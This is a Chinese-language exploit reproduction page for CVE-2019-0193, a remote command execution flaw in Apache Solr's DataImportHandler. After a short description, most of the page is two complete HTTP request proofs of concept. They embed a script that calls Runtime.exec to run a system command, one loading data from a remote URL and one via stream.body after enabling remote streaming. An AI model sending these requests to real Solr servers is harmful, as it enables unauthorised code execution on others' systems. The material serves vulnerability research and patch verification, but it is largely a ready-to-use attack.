---
title: （CVE-2019-0193）Apache Solr 远程命令执行漏洞
id: zhfly2826
---

# （CVE-2019-0193）Apache Solr 远程命令执行漏洞

## 一、漏洞简介

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。

## 二、漏洞影响

Apache Solr < 8.2.0

## 三、复现过程

### poc 一 ：需要目标出网，支持低版本检测

> 判断该索引库是否使用了DataImportHandler模块

*   访问 `http://www.0-sec.org:8983/solr/test_0nth3way/admin/mbeans?cat=QUERY&wt=json`

*   如果使用了`DataImportHandler`模块 则HTTP响应内会有: `org.apache.solr.handler.dataimport.DataImportHandler`

![1.png](../img/cc8112602ce8f8a955f207bfc2e482da.png)

*   构造HTTP请求，远程执行代码

```
POST /solr/test_0nth3way/dataimport HTTP/1.1
Host: www.0-sec.org:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.17.136:8983/solr/
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 1231
Connection: close

command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test_0nth3way&name=dataimport&dataConfig=

<dataConfig>

<dataSource type=“URLDataSource”/>

<script><![CDATA[

```
 function poc(row){ 
```

var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(“id”).getInputStream()));

var result = [];

while(true) {

var oneline = bufReader.readLine();

result.push( oneline );

if(!oneline) break;

}

row.put(“title”,result.join("\n\r"));

return row;

}

]]></script>

```
 &lt;document&gt;
         &lt;entity name="entity1"
                 url="https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml"
                 processor="XPathEntityProcessor"
                 forEach="/RDF/item"
                 transformer="script:poc"&gt;
                    &lt;field column="title" xpath="/RDF/item/title" /&gt;
         &lt;/entity&gt;
    &lt;/document&gt; 
```

</dataConfig> 
```

> demo.xml

> 若如上github因不可抗因素失效，可自行用自己vps搭建demo.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<RDF>
<item/>
</RDF> 
```

![2.png](../img/4d4d05d5c7a79f593af9549ccc4c8a78.png)

### poc 二 ：不需要目标出网，不支持低版本检测

*   判断该索引库是否使用了`DataImportHandler`模块（同上）

*   修改`configoverlay.json`文件中的配置，以启用远程流的相关选项 （enableStreamBody、enableRemoteStreaming） 注：某些低版本会不成功，即响应500；成功响应200

```
POST /solr/test_0nth3way/config HTTP/1.1
Host: www.0-sec.org:8983
Accept: */*
Content-type:application/json
Content-Length: 159
Connection: close `{“set-property”: {“requestDispatcher.requestParsers.enableRemoteStreaming”: true}, “set-property”: {“requestDispatcher.requestParsers.enableStreamBody”: true}}` 
```

*   构造HTTP请求，远程执行代码

```
POST /solr/test_0nth3way/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test_0nth3way&name=dataimport&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%64%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e HTTP/1.1
Host: www.0-sec.org:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.17.136:8983/solr/
Content-Length: 212
content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f

--------------------------aceb88c2159f183f

Content-Disposition: form-data; name=“stream.body”

<?xml version=“1.0” encoding=“UTF-8”?>

<RDF>

<item/>

</RDF> `--------------------------aceb88c2159f183f–` 
```

> 注：其中dataConfig的值，URLencode之前为以下字符串

```
<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />

<script><![CDATA[

function poc(row){

var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(“id”).getInputStream()));

var result = [];

while(true) {

var oneline = bufReader.readLine();

result.push( oneline );

if(!oneline) break;

}

row.put(“title”,result.join("\n\r"));

return row;

}

]]></script> `<document>

<entity

stream=“true”

name=“entity1”

datasource=“streamsrc1”

processor=“XPathEntityProcessor”

rootEntity=“true”

forEach="/RDF/item"

transformer=“script:poc”>

<field column=“title” xpath="/RDF/item/title" />

</entity>

</document>

</dataConfig>` 
```

![3.png](../img/8c0426c1225a8e48f1254bf0ca6aa580.png)

## 参考链接

> https://www.cnblogs.com/0nth3way/p/11908763.html